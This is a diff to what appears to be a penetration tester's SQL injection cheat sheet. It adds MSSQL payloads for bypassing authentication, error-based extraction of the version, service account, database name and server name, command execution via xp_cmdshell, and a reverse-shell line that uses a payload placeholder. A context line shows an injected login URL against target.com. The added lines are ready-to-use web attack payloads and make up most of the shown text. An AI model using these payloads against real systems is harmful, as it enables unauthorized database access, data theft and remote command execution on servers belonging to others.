@@ -16,6 +16,15 @@ http://target.com/user.php?name=admin&password=summer2016
 http://target.com/user.php?name=admin' or 1=1-- &password=summer2016
 ------------------------------------------------------------------------------------------------------
 
+Auth bypass:        'or 1=1--
+SQL version:        ' OR CONVERT(int,(@@VERSION))=1--
+Service account:    ' OR CONVERT(int,(SYSTEM_USER))=1--
+Database:           ' OR CONVERT(int,(DB_NAME()))=1--
+Server name:        ' OR CONVERT(int,(@@SERVERNAME))=1--
+Code execution:     '; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--
+Reverse shell:      '; EXEC master..xp_cmdshell '<unicorn payload>'--
+------------------------------------------------------------------------------------------------------
+
 ?sql_query 
 
 If you are reading the source code for a web page and discover ?sql_query in the code, this format is 
